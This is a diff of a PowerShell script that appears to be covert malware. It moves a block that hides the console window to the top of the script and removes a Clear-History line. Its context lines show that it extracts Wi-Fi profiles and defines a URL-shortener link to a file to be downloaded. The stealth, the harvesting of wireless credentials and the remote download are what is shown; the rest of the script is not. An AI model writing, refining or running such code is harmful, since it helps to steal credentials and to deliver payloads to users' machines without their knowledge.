@@ -1,14 +1,36 @@
 # ##############################################################################
-Clear-History
+Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class ConsoleWindow {
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetConsoleWindow();
+        [DllImport("user32.dll")]
+        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        public const int SW_HIDE = 0;
+        public const int SW_SHOW = 5;
+        public static void Hide() {
+            IntPtr hWnd = GetConsoleWindow();
+            ShowWindow(hWnd, SW_HIDE);
+        }
+        public static void Show() {
+            IntPtr hWnd = GetConsoleWindow();
+            ShowWindow(hWnd, SW_SHOW);
+        }
+    }
+"@
+
+# Hide the console window
+[ConsoleWindow]::Hide()
 
 ###############################################################################
 # Hide the console window
-Add-Type '[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow(); [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);' -Name 'Win32ShowWindow' -Namespace 'Win32' -PassThru | Out-Null
-$consolePtr = [Win32.Win32ShowWindow]::GetConsoleWindow()
-[Win32.Win32ShowWindow]::ShowWindow($consolePtr, 0)  # 0 hides the window
+# Add-Type '[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow(); [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);' -Name 'Win32ShowWindow' -Namespace 'Win32' -PassThru | Out-Null
+# $consolePtr = [Win32.Win32ShowWindow]::GetConsoleWindow()
+# [Win32.Win32ShowWindow]::ShowWindow($consolePtr, 0)  # 0 hides the window
 
-# Set ErrorActionPreference to stop throwing red error messages
-$ErrorActionPreference = 'Stop'
+# # Set ErrorActionPreference to stop throwing red error messages
+# $ErrorActionPreference = 'Stop'
 
 try {
     # Extract Wi-Fi profiles
@@ -48,29 +70,7 @@ Clear-History
 
 ###############################################################################
 
-Add-Type @"
-    using System;
-    using System.Runtime.InteropServices;
-    public class ConsoleWindow {
-        [DllImport("kernel32.dll")]
-        public static extern IntPtr GetConsoleWindow();
-        [DllImport("user32.dll")]
-        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-        public const int SW_HIDE = 0;
-        public const int SW_SHOW = 5;
-        public static void Hide() {
-            IntPtr hWnd = GetConsoleWindow();
-            ShowWindow(hWnd, SW_HIDE);
-        }
-        public static void Show() {
-            IntPtr hWnd = GetConsoleWindow();
-            ShowWindow(hWnd, SW_SHOW);
-        }
-    }
-"@
 
-# Hide the console window
-[ConsoleWindow]::Hide()
 
 # Define the URL of the file to be downloaded
 $url = "https://lnkfwd.com/u/Kpj_Yric"  # Replace with your file URL
